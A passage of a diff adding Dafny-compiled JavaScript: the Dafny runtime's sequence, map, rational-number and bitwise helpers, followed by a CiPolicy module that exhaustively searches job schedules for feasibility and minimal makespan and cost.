+      return "[" + arrayElementsToString(this) + "]";
+    }
+    toVerbatimString(asLiteral) {
+      if (asLiteral) {
+        return '"' + this.map((c) => _dafny.escapeCharacter(c)).join("") + '"';
+      } else {
+        return this.map((c) => String.fromCodePoint(c.value)).join("");
+      }
+    }
+    static update(s, i, v) {
+      if (typeof s === "string") {
+        let p = s.slice(0, i);
+        let q = s.slice(i.toNumber() + 1);
+        return p.concat(v, q);
+      } else {
+        let t = s.slice();
+        t[i] = v;
+        return t;
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.length !== other.length) {
+        return false;
+      }
+      for (let i = 0; i < this.length; i++) {
+        if (!_dafny.areEqual(this[i], other[i])) {
+          return false;
+        }
+      }
+      return true;
+    }
+    static contains(s, k) {
+      if (typeof s === "string") {
+        return s.includes(k);
+      } else {
+        for (let x of s) {
+          if (_dafny.areEqual(x, k)) {
+            return true;
+          }
+        }
+        return false;
+      }
+    }
+    get Elements() {
+      return this;
+    }
+    get UniqueElements() {
+      return _dafny.Set.fromElements(...this);
+    }
+    static Concat(a, b) {
+      if (typeof a === "string" || typeof b === "string") {
+        if (typeof a !== "string") {
+          a = a.join("");
+        }
+        if (typeof b !== "string") {
+          b = b.join("");
+        }
+        return a + b;
+      } else {
+        let r = Seq.of(...a);
+        r.push(...b);
+        return r;
+      }
+    }
+    static JoinIfPossible(x) {
+      try {
+        return x.join("");
+      } catch (_error) {
+        return x;
+      }
+    }
+    static IsPrefixOf(a, b) {
+      if (b.length < a.length) {
+        return false;
+      }
+      for (let i = 0; i < a.length; i++) {
+        if (!_dafny.areEqual(a[i], b[i])) {
+          return false;
+        }
+      }
+      return true;
+    }
+    static IsProperPrefixOf(a, b) {
+      if (b.length <= a.length) {
+        return false;
+      }
+      for (let i = 0; i < a.length; i++) {
+        if (!_dafny.areEqual(a[i], b[i])) {
+          return false;
+        }
+      }
+      return true;
+    }
+  };
+  $module.Map = class Map2 extends Array {
+    constructor() {
+      super();
+    }
+    static get Default() {
+      return Map2.of();
+    }
+    toString() {
+      return "map[" + this.map((maplet) => _dafny.toString(maplet[0]) + " := " + _dafny.toString(maplet[1])).join(", ") + "]";
+    }
+    static get Empty() {
+      if (this._empty === void 0) {
+        this._empty = new Map2();
+      }
+      return this._empty;
+    }
+    findIndex(k) {
+      for (let i = 0; i < this.length; i++) {
+        if (_dafny.areEqual(this[i][0], k)) {
+          return i;
+        }
+      }
+      return this.length;
+    }
+    get(k) {
+      let i = this.findIndex(k);
+      if (i === this.length) {
+        return void 0;
+      } else {
+        return this[i][1];
+      }
+    }
+    contains(k) {
+      return this.findIndex(k) < this.length;
+    }
+    update(k, v) {
+      let m = this.slice();
+      m.updateUnsafe(k, v);
+      return m;
+    }
+    // Similar to update, but make the modification in-place.
+    // Meant to be used in the map constructor.
+    updateUnsafe(k, v) {
+      let m = this;
+      let i = m.findIndex(k);
+      m[i] = [k, v];
+      return m;
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.length !== other.length) {
+        return false;
+      }
+      for (let e of this) {
+        let [k, v] = e;
+        let w = other.get(k);
+        if (w === void 0 || !_dafny.areEqual(v, w)) {
+          return false;
+        }
+      }
+      return true;
+    }
+    get Keys() {
+      let s = new _dafny.Set();
+      for (let e of this) {
+        let [k, v] = e;
+        s.push(k);
+      }
+      return s;
+    }
+    get Values() {
+      let s = new _dafny.Set();
+      for (let e of this) {
+        let [k, v] = e;
+        s.add(v);
+      }
+      return s;
+    }
+    get Items() {
+      let s = new _dafny.Set();
+      for (let e of this) {
+        let [k, v] = e;
+        s.push(_dafny.Tuple.of(k, v));
+      }
+      return s;
+    }
+    Merge(that) {
+      let m = that.slice();
+      for (let e of this) {
+        let [k, v] = e;
+        let i = m.findIndex(k);
+        if (i == m.length) {
+          m[i] = [k, v];
+        }
+      }
+      return m;
+    }
+    Subtract(keys) {
+      if (this.length === 0 || keys.length === 0) {
+        return this;
+      }
+      let m = new Map2();
+      for (let e of this) {
+        let [k, v] = e;
+        if (!keys.contains(k)) {
+          m[m.length] = e;
+        }
+      }
+      return m;
+    }
+  };
+  $module.newArray = function(initValue, ...dims) {
+    return { dims, elmts: buildArray(initValue, ...dims) };
+  };
+  $module.BigOrdinal = class BigOrdinal {
+    static get Default() {
+      return _dafny.ZERO;
+    }
+    static IsLimit(ord) {
+      return ord.isZero();
+    }
+    static IsSucc(ord) {
+      return ord.isGreaterThan(0);
+    }
+    static Offset(ord) {
+      return ord;
+    }
+    static IsNat(ord) {
+      return true;
+    }
+  };
+  $module.BigRational = class BigRational {
+    static get ZERO() {
+      if (this._zero === void 0) {
+        this._zero = new BigRational(_dafny.ZERO);
+      }
+      return this._zero;
+    }
+    constructor(n, d) {
+      this.num = n;
+      this.den = d === void 0 ? _dafny.ONE : d;
+    }
+    static get Default() {
+      return _dafny.BigRational.ZERO;
+    }
+    // We need to deal with the special case `num == 0 && den == 0`, because
+    // that's what C#'s default struct constructor will produce for BigRational. :(
+    // To deal with it, we ignore `den` when `num` is 0.
+    toString() {
+      if (this.num.isZero() || this.den.isEqualTo(1)) {
+        return this.num.toFixed() + ".0";
+      }
+      let answer = this.dividesAPowerOf10(this.den);
+      if (answer !== void 0) {
+        let n = this.num.multipliedBy(answer[0]);
+        let log10 = answer[1];
+        let sign, digits;
+        if (this.num.isLessThan(0)) {
+          sign = "-";
+          digits = n.negated().toFixed();
+        } else {
+          sign = "";
+          digits = n.toFixed();
+        }
+        if (log10 < digits.length) {
+          let digitCount = digits.length - log10;
+          return sign + digits.slice(0, digitCount) + "." + digits.slice(digitCount);
+        } else {
+          return sign + "0." + "0".repeat(log10 - digits.length) + digits;
+        }
+      } else {
+        return "(" + this.num.toFixed() + ".0 / " + this.den.toFixed() + ".0)";
+      }
+    }
+    isPowerOf10(x) {
+      if (x.isZero()) {
+        return void 0;
+      }
+      let log10 = 0;
+      while (true) {
+        if (x.isEqualTo(1)) {
+          return log10;
+        } else if (x.mod(10).isZero()) {
+          log10++;
+          x = x.dividedToIntegerBy(10);
+        } else {
+          return void 0;
+        }
+      }
+    }
+    dividesAPowerOf10(i) {
+      let factor = _dafny.ONE;
+      let log10 = 0;
+      if (i.isLessThanOrEqualTo(_dafny.ZERO)) {
+        return void 0;
+      }
+      while (i.mod(10).isZero()) {
+        i = i.dividedToIntegerBy(10);
+        log10++;
+      }
+      while (i.mod(5).isZero()) {
+        i = i.dividedToIntegerBy(5);
+        factor = factor.multipliedBy(2);
+        log10++;
+      }
+      while (i.mod(2).isZero()) {
+        i = i.dividedToIntegerBy(2);
+        factor = factor.multipliedBy(5);
+        log10++;
+      }
+      if (i.isEqualTo(_dafny.ONE)) {
+        return [factor, log10];
+      } else {
+        return void 0;
+      }
+    }
+    toBigNumber() {
+      if (this.num.isZero() || this.den.isEqualTo(1)) {
+        return this.num;
+      } else if (this.num.isGreaterThan(0)) {
+        return this.num.dividedToIntegerBy(this.den);
+      } else {
+        return this.num.minus(this.den).plus(1).dividedToIntegerBy(this.den);
+      }
+    }
+    isInteger() {
+      return this.equals(new _dafny.BigRational(this.toBigNumber(), _dafny.ONE));
+    }
+    // Returns values such that aa/dd == a and bb/dd == b.
+    normalize(b) {
+      let a = this;
+      let aa, bb, dd;
+      if (a.num.isZero()) {
+        aa = a.num;
+        bb = b.num;
+        dd = b.den;
+      } else if (b.num.isZero()) {
+        aa = a.num;
+        dd = a.den;
+        bb = b.num;
+      } else {
+        let gcd = BigNumberGcd(a.den, b.den);
+        let xx = a.den.dividedToIntegerBy(gcd);
+        let yy = b.den.dividedToIntegerBy(gcd);
+        aa = a.num.multipliedBy(yy);
+        bb = b.num.multipliedBy(xx);
+        dd = a.den.multipliedBy(yy);
+      }
+      return [aa, bb, dd];
+    }
+    compareTo(that) {
+      let asign = this.num.isZero() ? 0 : this.num.isLessThan(0) ? -1 : 1;
+      let bsign = that.num.isZero() ? 0 : that.num.isLessThan(0) ? -1 : 1;
+      if (asign < 0 && 0 <= bsign) {
+        return -1;
+      } else if (asign <= 0 && 0 < bsign) {
+        return -1;
+      } else if (bsign < 0 && 0 <= asign) {
+        return 1;
+      } else if (bsign <= 0 && 0 < asign) {
+        return 1;
+      }
+      let [aa, bb, dd] = this.normalize(that);
+      if (aa.isLessThan(bb)) {
+        return -1;
+      } else if (aa.isEqualTo(bb)) {
+        return 0;
+      } else {
+        return 1;
+      }
+    }
+    equals(that) {
+      return this.compareTo(that) === 0;
+    }
+    isLessThan(that) {
+      return this.compareTo(that) < 0;
+    }
+    isAtMost(that) {
+      return this.compareTo(that) <= 0;
+    }
+    plus(b) {
+      let [aa, bb, dd] = this.normalize(b);
+      return new BigRational(aa.plus(bb), dd);
+    }
+    minus(b) {
+      let [aa, bb, dd] = this.normalize(b);
+      return new BigRational(aa.minus(bb), dd);
+    }
+    negated() {
+      return new BigRational(this.num.negated(), this.den);
+    }
+    multipliedBy(b) {
+      return new BigRational(this.num.multipliedBy(b.num), this.den.multipliedBy(b.den));
+    }
+    dividedBy(b) {
+      let a = this;
+      let bReciprocal;
+      if (b.num.isGreaterThan(0)) {
+        bReciprocal = new BigRational(b.den, b.num);
+      } else {
+        bReciprocal = new BigRational(b.den.negated(), b.num.negated());
+      }
+      return a.multipliedBy(bReciprocal);
+    }
+  };
+  $module.EuclideanDivisionNumber = function(a, b) {
+    if (0 <= a) {
+      if (0 <= b) {
+        return Math.floor(a / b);
+      } else {
+        return -Math.floor(a / -b);
+      }
+    } else {
+      if (0 <= b) {
+        return -Math.floor((-a - 1) / b) - 1;
+      } else {
+        return Math.floor((-a - 1) / -b) + 1;
+      }
+    }
+  };
+  $module.EuclideanDivision = function(a, b) {
+    if (a.isGreaterThanOrEqualTo(0)) {
+      if (b.isGreaterThanOrEqualTo(0)) {
+        return a.dividedToIntegerBy(b);
+      } else {
+        return a.dividedToIntegerBy(b.negated()).negated();
+      }
+    } else {
+      if (b.isGreaterThanOrEqualTo(0)) {
+        return a.negated().minus(1).dividedToIntegerBy(b).negated().minus(1);
+      } else {
+        return a.negated().minus(1).dividedToIntegerBy(b.negated()).plus(1);
+      }
+    }
+  };
+  $module.EuclideanModuloNumber = function(a, b) {
+    let bp = Math.abs(b);
+    if (0 <= a) {
+      return a % bp;
+    } else {
+      let c = -a % bp;
+      return c === 0 ? c : bp - c;
+    }
+  };
+  $module.ShiftLeft = function(b, n) {
+    return b.multipliedBy(new BigNumber(2).exponentiatedBy(n));
+  };
+  $module.ShiftRight = function(b, n) {
+    return b.dividedToIntegerBy(new BigNumber(2).exponentiatedBy(n));
+  };
+  $module.RotateLeft = function(b, n, w) {
+    let x = _dafny.ShiftLeft(b, n).mod(new BigNumber(2).exponentiatedBy(w));
+    let y = _dafny.ShiftRight(b, w - n);
+    return x.plus(y);
+  };
+  $module.RotateRight = function(b, n, w) {
+    let x = _dafny.ShiftRight(b, n);
+    let y = _dafny.ShiftLeft(b, w - n).mod(new BigNumber(2).exponentiatedBy(w));
+    ;
+    return x.plus(y);
+  };
+  $module.BitwiseAnd = function(a, b) {
+    let r = _dafny.ZERO;
+    const m = _dafny.NUMBER_LIMIT;
+    let h = _dafny.ONE;
+    while (!a.isZero() && !b.isZero()) {
+      let a0 = a.mod(m);
+      let b0 = b.mod(m);
+      r = r.plus(h.multipliedBy(a0 & b0));
+      a = a.dividedToIntegerBy(m);
+      b = b.dividedToIntegerBy(m);
+      h = h.multipliedBy(m);
+    }
+    return r;
+  };
+  $module.BitwiseOr = function(a, b) {
+    let r = _dafny.ZERO;
+    const m = _dafny.NUMBER_LIMIT;
+    let h = _dafny.ONE;
+    while (!a.isZero() && !b.isZero()) {
+      let a0 = a.mod(m);
+      let b0 = b.mod(m);
+      r = r.plus(h.multipliedBy(a0 | b0));
+      a = a.dividedToIntegerBy(m);
+      b = b.dividedToIntegerBy(m);
+      h = h.multipliedBy(m);
+    }
+    r = r.plus(h.multipliedBy(a | b));
+    return r;
+  };
+  $module.BitwiseXor = function(a, b) {
+    let r = _dafny.ZERO;
+    const m = _dafny.NUMBER_LIMIT;
+    let h = _dafny.ONE;
+    while (!a.isZero() && !b.isZero()) {
+      let a0 = a.mod(m);
+      let b0 = b.mod(m);
+      r = r.plus(h.multipliedBy(a0 ^ b0));
+      a = a.dividedToIntegerBy(m);
+      b = b.dividedToIntegerBy(m);
+      h = h.multipliedBy(m);
+    }
+    r = r.plus(h.multipliedBy(a | b));
+    return r;
+  };
+  $module.BitwiseNot = function(a, bits) {
+    let r = _dafny.ZERO;
+    let h = _dafny.ONE;
+    for (let i = 0; i < bits; i++) {
+      let bit = a.mod(2);
+      if (bit.isZero()) {
+        r = r.plus(h);
+      }
+      a = a.dividedToIntegerBy(2);
+      h = h.multipliedBy(2);
+    }
+    return r;
+  };
+  $module.Quantifier = function(vals, frall, pred) {
+    for (let u of vals) {
+      if (pred(u) !== frall) {
+        return !frall;
+      }
+    }
+    return frall;
+  };
+  $module.PlusChar = function(a, b) {
+    return String.fromCharCode(a.charCodeAt(0) + b.charCodeAt(0));
+  };
+  $module.UnicodePlusChar = function(a, b) {
+    return new _dafny.CodePoint(a.value + b.value);
+  };
+  $module.MinusChar = function(a, b) {
+    return String.fromCharCode(a.charCodeAt(0) - b.charCodeAt(0));
+  };
+  $module.UnicodeMinusChar = function(a, b) {
+    return new _dafny.CodePoint(a.value - b.value);
+  };
+  $module.AllBooleans = function* () {
+    yield false;
+    yield true;
+  };
+  $module.AllChars = function* () {
+    for (let i = 0; i < 65536; i++) {
+      yield String.fromCharCode(i);
+    }
+  };
+  $module.AllUnicodeChars = function* () {
+    for (let i = 0; i < 55296; i++) {
+      yield new _dafny.CodePoint(i);
+    }
+    for (let i = 917504; i < 1114112; i++) {
+      yield new _dafny.CodePoint(i);
+    }
+  };
+  $module.AllIntegers = function* () {
+    yield _dafny.ZERO;
+    for (let j = _dafny.ONE; ; j = j.plus(1)) {
+      yield j;
+      yield j.negated();
+    }
+  };
+  $module.IntegerRange = function* (lo, hi) {
+    if (lo === null) {
+      while (true) {
+        hi = hi.minus(1);
+        yield hi;
+      }
+    } else if (hi === null) {
+      while (true) {
+        yield lo;
+        lo = lo.plus(1);
+      }
+    } else {
+      while (lo.isLessThan(hi)) {
+        yield lo;
+        lo = lo.plus(1);
+      }
+    }
+  };
+  $module.SingleValue = function* (v) {
+    yield v;
+  };
+  $module.HaltException = class HaltException extends Error {
+    constructor(message) {
+      super(message);
+    }
+  };
+  $module.HandleHaltExceptions = function(f) {
+    try {
+      f();
+    } catch (e) {
+      if (e instanceof _dafny.HaltException) {
+        process.stdout.write("[Program halted] " + e.message + "\n");
+        process.exitCode = 1;
+      } else {
+        throw e;
+      }
+    }
+  };
+  $module.FromMainArguments = function(args) {
+    var a = [...args];
+    a.splice(0, 2, args[0] + " " + args[1]);
+    return a;
+  };
+  $module.UnicodeFromMainArguments = function(args) {
+    return $module.FromMainArguments(args).map(_dafny.Seq.UnicodeFromString);
+  };
+  return $module;
+  function buildArray(initValue, ...dims) {
+    if (dims.length === 0) {
+      return initValue;
+    } else {
+      let a = Array(dims[0].toNumber());
+      let b = Array.from(a, (x) => buildArray(initValue, ...dims.slice(1)));
+      return b;
+    }
+  }
+  function arrayElementsToString(a) {
+    let s = "";
+    let sep3 = "";
+    for (let x of a) {
+      s += sep3 + _dafny.toString(x);
+      sep3 = ", ";
+    }
+    return s;
+  }
+  function BigNumberGcd(a, b) {
+    while (true) {
+      if (a.isZero()) {
+        return b;
+      } else if (b.isZero()) {
+        return a;
+      }
+      if (a.isLessThan(b)) {
+        b = b.modulo(a);
+      } else {
+        a = a.modulo(b);
+      }
+    }
+  }
+})();
+var _System = (function() {
+  let $module = {};
+  $module.nat = class nat {
+    constructor() {
+    }
+    static get Default() {
+      return _dafny.ZERO;
+    }
+    static _Is(__source) {
+      let _0_x = __source;
+      return _dafny.ZERO.isLessThanOrEqualTo(_0_x);
+    }
+  };
+  return $module;
+})();
+var CiPolicy = (function() {
+  let $module = {};
+  $module.__default = class __default {
+    constructor() {
+      this._tname = "CiPolicy._default";
+    }
+    _parentTraits() {
+      return [];
+    }
+    static ValidMode(mode) {
+      return _dafny.ONE.isLessThanOrEqualTo(mode.dtor_duration) && mode.dtor_duration.isLessThanOrEqualTo(CiPolicy.__default.MaxDuration) && (_dafny.ZERO.isLessThanOrEqualTo(mode.dtor_cost) && mode.dtor_cost.isLessThanOrEqualTo(CiPolicy.__default.MaxModeCost)) && (_dafny.ONE.isLessThanOrEqualTo(mode.dtor_demand) && mode.dtor_demand.isLessThanOrEqualTo(CiPolicy.__default.MaxCapacity));
+    }
+    static Valid(environment2) {
+      return new BigNumber(environment2.dtor_jobs.length).isLessThanOrEqualTo(CiPolicy.__default.MaxJobs) && (_dafny.ONE.isLessThanOrEqualTo(environment2.dtor_horizon) && environment2.dtor_horizon.isLessThanOrEqualTo(CiPolicy.__default.MaxHorizon)) && (_dafny.ONE.isLessThanOrEqualTo(environment2.dtor_capacity) && environment2.dtor_capacity.isLessThanOrEqualTo(CiPolicy.__default.MaxCapacity)) && (_dafny.ZERO.isLessThanOrEqualTo(environment2.dtor_costLimit) && environment2.dtor_costLimit.isLessThanOrEqualTo(CiPolicy.__default.MaxJobs.multipliedBy(CiPolicy.__default.MaxModeCost))) && _dafny.Quantifier(_dafny.IntegerRange(_dafny.ZERO, new BigNumber(environment2.dtor_jobs.length)), true, function(_forall_var_0) {
+        let _0_j = _forall_var_0;
+        return !(_dafny.ZERO.isLessThanOrEqualTo(_0_j) && _0_j.isLessThan(new BigNumber(environment2.dtor_jobs.length))) || _dafny.ONE.isLessThanOrEqualTo(new BigNumber(environment2.dtor_jobs[_0_j].dtor_modes.length)) && new BigNumber(environment2.dtor_jobs[_0_j].dtor_modes.length).isLessThanOrEqualTo(CiPolicy.__default.MaxModes) && _dafny.Quantifier(environment2.dtor_jobs[_0_j].dtor_modes.UniqueElements, true, function(_forall_var_1) {
+          let _1_mode = _forall_var_1;
+          return !_dafny.Seq.contains(environment2.dtor_jobs[_0_j].dtor_modes, _1_mode) || CiPolicy.__default.ValidMode(_1_mode);
+        }) && _dafny.Quantifier(environment2.dtor_jobs[_0_j].dtor_needs.UniqueElements, true, function(_forall_var_2) {
+          let _2_dependency = _forall_var_2;
+          return !_dafny.Seq.contains(environment2.dtor_jobs[_0_j].dtor_needs, _2_dependency) || _dafny.ZERO.isLessThanOrEqualTo(_2_dependency) && _2_dependency.isLessThan(_0_j);
+        });
+      });
+    }
+    static DomainParameters(jobs, horizon) {
+      return _dafny.ZERO.isLessThan(horizon) && _dafny.Quantifier(jobs.UniqueElements, true, function(_forall_var_0) {
+        let _0_job = _forall_var_0;
+        return !_dafny.Seq.contains(jobs, _0_job) || _dafny.ZERO.isLessThan(new BigNumber(_0_job.dtor_modes.length));
+      });
+    }
+    static Choices(jobs, policy2) {
+      return new BigNumber(jobs.length).isEqualTo(new BigNumber(policy2.length)) && _dafny.Quantifier(_dafny.IntegerRange(_dafny.ZERO, new BigNumber(jobs.length)), true, function(_forall_var_0) {
+        let _0_j = _forall_var_0;
+        return !(_dafny.ZERO.isLessThanOrEqualTo(_0_j) && _0_j.isLessThan(new BigNumber(jobs.length))) || _dafny.ZERO.isLessThanOrEqualTo(policy2[_0_j].dtor_mode) && policy2[_0_j].dtor_mode.isLessThan(new BigNumber(jobs[_0_j].dtor_modes.length));
+      });
+    }
+    static InDomain(jobs, horizon, policy2) {
+      return CiPolicy.__default.Choices(jobs, policy2) && _dafny.Quantifier(_dafny.IntegerRange(_dafny.ZERO, new BigNumber(jobs.length)), true, function(_forall_var_0) {
+        let _0_j = _forall_var_0;
+        return !(_dafny.ZERO.isLessThanOrEqualTo(_0_j) && _0_j.isLessThan(new BigNumber(jobs.length))) || _dafny.ZERO.isLessThanOrEqualTo(policy2[_0_j].dtor_start) && policy2[_0_j].dtor_start.isLessThan(horizon);
+      });
+    }
+    static Finish(jobs, policy2, j) {
+      return policy2[j].dtor_start.plus(jobs[j].dtor_modes[policy2[j].dtor_mode].dtor_duration);
+    }
+    static Cost(jobs, policy2, n) {
+      let _0___accumulator = _dafny.ZERO;
+      TAIL_CALL_START: while (true) {
+        if (n.isEqualTo(_dafny.ZERO)) {
+          return _dafny.ZERO.plus(_0___accumulator);
+        } else {
+          _0___accumulator = jobs[n.minus(_dafny.ONE)].dtor_modes[policy2[n.minus(_dafny.ONE)].dtor_mode].dtor_cost.plus(_0___accumulator);
+          let _in0 = jobs;
+          let _in1 = policy2;
+          let _in2 = n.minus(_dafny.ONE);
+          jobs = _in0;
+          policy2 = _in1;
+          n = _in2;
+          continue TAIL_CALL_START;
+        }
+      }
+    }
+    static Max(a, b) {
+      if (b.isLessThanOrEqualTo(a)) {
+        return a;
+      } else {
+        return b;
+      }
+    }
+    static Makespan(jobs, policy2, n) {
+      if (n.isEqualTo(_dafny.ZERO)) {
+        return _dafny.ZERO;
+      } else {
+        return CiPolicy.__default.Max(CiPolicy.__default.Makespan(jobs, policy2, n.minus(_dafny.ONE)), CiPolicy.__default.Finish(jobs, policy2, n.minus(_dafny.ONE)));
+      }
+    }
+    static Load(jobs, policy2, tick, n) {
+      let _0___accumulator = _dafny.ZERO;
+      TAIL_CALL_START: while (true) {
+        if (n.isEqualTo(_dafny.ZERO)) {
+          return _dafny.ZERO.plus(_0___accumulator);
+        } else {
+          _0___accumulator = (policy2[n.minus(_dafny.ONE)].dtor_start.isLessThanOrEqualTo(tick) && tick.isLessThan(CiPolicy.__default.Finish(jobs, policy2, n.minus(_dafny.ONE))) ? jobs[n.minus(_dafny.ONE)].dtor_modes[policy2[n.minus(_dafny.ONE)].dtor_mode].dtor_demand : _dafny.ZERO).plus(_0___accumulator);
+          let _in0 = jobs;
+          let _in1 = policy2;
+          let _in2 = tick;
+          let _in3 = n.minus(_dafny.ONE);
+          jobs = _in0;
+          policy2 = _in1;
+          tick = _in2;
+          n = _in3;
+          continue TAIL_CALL_START;
+        }
+      }
+    }
+    static Feasible(environment2, policy2) {
+      return CiPolicy.__default.Choices(environment2.dtor_jobs, policy2) && _dafny.Quantifier(_dafny.IntegerRange(_dafny.ZERO, new BigNumber(environment2.dtor_jobs.length)), true, function(_forall_var_0) {
+        let _0_j = _forall_var_0;
+        return !(_dafny.ZERO.isLessThanOrEqualTo(_0_j) && _0_j.isLessThan(new BigNumber(environment2.dtor_jobs.length))) || _dafny.ZERO.isLessThanOrEqualTo(policy2[_0_j].dtor_start) && CiPolicy.__default.Finish(environment2.dtor_jobs, policy2, _0_j).isLessThanOrEqualTo(environment2.dtor_horizon);
+      }) && CiPolicy.__default.Cost(environment2.dtor_jobs, policy2, new BigNumber(environment2.dtor_jobs.length)).isLessThanOrEqualTo(environment2.dtor_costLimit) && _dafny.Quantifier(_dafny.IntegerRange(_dafny.ZERO, new BigNumber(environment2.dtor_jobs.length)), true, function(_forall_var_1) {
+        let _1_j = _forall_var_1;
+        return !(_dafny.ZERO.isLessThanOrEqualTo(_1_j) && _1_j.isLessThan(new BigNumber(environment2.dtor_jobs.length))) || _dafny.Quantifier(environment2.dtor_jobs[_1_j].dtor_needs.UniqueElements, true, function(_forall_var_2) {
+          let _2_dependency = _forall_var_2;
+          return !_dafny.Seq.contains(environment2.dtor_jobs[_1_j].dtor_needs, _2_dependency) || CiPolicy.__default.Finish(environment2.dtor_jobs, policy2, _2_dependency).isLessThanOrEqualTo(policy2[_1_j].dtor_start);
+        });
+      }) && _dafny.Quantifier(_dafny.IntegerRange(_dafny.ZERO, environment2.dtor_horizon), true, function(_forall_var_3) {
+        let _3_tick = _forall_var_3;
+        return !(_dafny.ZERO.isLessThanOrEqualTo(_3_tick) && _3_tick.isLessThan(environment2.dtor_horizon)) || CiPolicy.__default.Load(environment2.dtor_jobs, policy2, _3_tick, new BigNumber(environment2.dtor_jobs.length)).isLessThanOrEqualTo(environment2.dtor_capacity);
+      });
+    }
+    static Evaluate(environment2, policy2) {
+      return CiPolicy.Objective.create_Objective(CiPolicy.__default.Makespan(environment2.dtor_jobs, policy2, new BigNumber(environment2.dtor_jobs.length)), CiPolicy.__default.Cost(environment2.dtor_jobs, policy2, new BigNumber(environment2.dtor_jobs.length)));
+    }
+    static PolicyCount(jobs, horizon) {
+      let _0___accumulator = _dafny.ONE;
+      TAIL_CALL_START: while (true) {
+        if (new BigNumber(jobs.length).isEqualTo(_dafny.ZERO)) {
+          return _dafny.ONE.multipliedBy(_0___accumulator);
+        } else {
+          _0___accumulator = _0___accumulator.multipliedBy(horizon.multipliedBy(new BigNumber(jobs[_dafny.ZERO].dtor_modes.length)));
+          let _in0 = jobs.slice(_dafny.ONE);
+          let _in1 = horizon;
+          jobs = _in0;
+          horizon = _in1;
+          continue TAIL_CALL_START;
+        }
+      }
+    }
+    static Decode(jobs, horizon, rank2) {
+      let _0___accumulator = _dafny.Seq.of();
+      TAIL_CALL_START: while (true) {
+        if (new BigNumber(jobs.length).isEqualTo(_dafny.ZERO)) {
+          return _dafny.Seq.Concat(_0___accumulator, _dafny.Seq.of());
+        } else {
+          let _1_tailCount = CiPolicy.__default.PolicyCount(jobs.slice(_dafny.ONE), horizon);
+          let _2_digit = _dafny.EuclideanDivision(rank2, _1_tailCount);
+          _0___accumulator = _dafny.Seq.Concat(_0___accumulator, _dafny.Seq.of(CiPolicy.Placement.create_Placement(_dafny.EuclideanDivision(_2_digit, horizon), _2_digit.mod(horizon))));
+          let _in0 = jobs.slice(_dafny.ONE);
+          let _in1 = horizon;
+          let _in2 = rank2.mod(_1_tailCount);
+          jobs = _in0;
+          horizon = _in1;
+          rank2 = _in2;
+          continue TAIL_CALL_START;
+        }
+      }
+    }
+    static Encode(jobs, horizon, policy2) {
+      if (new BigNumber(jobs.length).isEqualTo(_dafny.ZERO)) {
+        return _dafny.ZERO;
+      } else {
+        let _0_digit = policy2[_dafny.ZERO].dtor_mode.multipliedBy(horizon).plus(policy2[_dafny.ZERO].dtor_start);
+        let _1_tailCount = CiPolicy.__default.PolicyCount(jobs.slice(_dafny.ONE), horizon);
+        let _2_tailRank = CiPolicy.__default.Encode(jobs.slice(_dafny.ONE), horizon, policy2.slice(_dafny.ONE));
+        return _0_digit.multipliedBy(_1_tailCount).plus(_2_tailRank);
+      }
+    }
+    static Preferred(a, ai, b, bi) {
+      return a.dtor_makespan.isLessThan(b.dtor_makespan) || a.dtor_makespan.isEqualTo(b.dtor_makespan) && (a.dtor_cost.isLessThan(b.dtor_cost) || a.dtor_cost.isEqualTo(b.dtor_cost) && ai.isLessThanOrEqualTo(bi));
+    }
+    static Optimize(environment2, budget) {
+      let result = CiPolicy.Result.Default();
+      if (!CiPolicy.__default.Valid(environment2) || !(_dafny.ONE.isLessThanOrEqualTo(budget) && budget.isLessThanOrEqualTo(CiPolicy.__default.MaxSearchBudget))) {
+        result = CiPolicy.Result.create_Invalid();
+        return result;
+      }
+      let _0_jobs;
+      let _1_horizon;
+      let _rhs0 = environment2.dtor_jobs;
+      let _rhs1 = environment2.dtor_horizon;
+      _0_jobs = _rhs0;
+      _1_horizon = _rhs1;
+      let _2_count;
+      _2_count = CiPolicy.__default.PolicyCount(_0_jobs, _1_horizon);
+      if (budget.isLessThan(_2_count)) {
+        result = CiPolicy.Result.create_Exhausted(_2_count);
+        return result;
+      }
+      let _3_winner;
+      _3_winner = new BigNumber(-1);
+      let _4_rank;
+      _4_rank = _dafny.ZERO;
+      while (_4_rank.isLessThan(_2_count)) {
+        let _5_policy;
+        _5_policy = CiPolicy.__default.Decode(_0_jobs, _1_horizon, _4_rank);
+        if (CiPolicy.__default.Feasible(environment2, _5_policy)) {
+          if (_3_winner.isEqualTo(new BigNumber(-1))) {
+            _3_winner = _4_rank;
+          } else if (CiPolicy.__default.Preferred(CiPolicy.__default.Evaluate(environment2, _5_policy), _4_rank, CiPolicy.__default.Evaluate(environment2, CiPolicy.__default.Decode(_0_jobs, _1_horizon, _3_winner)), _3_winner)) {
+            _3_winner = _4_rank;
+          } else {
+          }
+        }
+        _4_rank = _4_rank.plus(_dafny.ONE);
+      }
+      if (_3_winner.isEqualTo(new BigNumber(-1))) {
+        result = CiPolicy.Result.create_Infeasible(_2_count);
+      } else {
+        let _6_policy;
+        _6_policy = CiPolicy.__default.Decode(_0_jobs, _1_horizon, _3_winner);
+        result = CiPolicy.Result.create_Optimal(_2_count, _3_winner, _6_policy, CiPolicy.__default.Evaluate(environment2, _6_policy));
+      }
+      return result;
+    }
+    static get MaxDuration() {
+      return new BigNumber(32);
+    }
+    static get MaxModeCost() {
+      return new BigNumber(1e6);
+    }
+    static get MaxCapacity() {
+      return new BigNumber(8);
+    }
+    static get MaxJobs() {
+      return new BigNumber(8);
+    }
+    static get MaxHorizon() {
+      return new BigNumber(16);
+    }
+    static get MaxModes() {
+      return new BigNumber(4);
+    }
+    static get MaxSearchBudget() {
+      return new BigNumber(25e4);
+    }
+    static get DefaultSearchBudget() {
+      return new BigNumber(5e4);
+    }
+  };
+  $module.Mode = class Mode {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Mode(duration4, cost, demand) {
+      let $dt = new Mode(0);
+      $dt.duration = duration4;
+      $dt.cost = cost;
+      $dt.demand = demand;
+      return $dt;
+    }
+    get is_Mode() {
+      return this.$tag === 0;
+    }
+    get dtor_duration() {
+      return this.duration;
+    }
+    get dtor_cost() {
+      return this.cost;
+    }
+    get dtor_demand() {
+      return this.demand;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "CiPolicy.Mode.Mode(" + _dafny.toString(this.duration) + ", " + _dafny.toString(this.cost) + ", " + _dafny.toString(this.demand) + ")";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
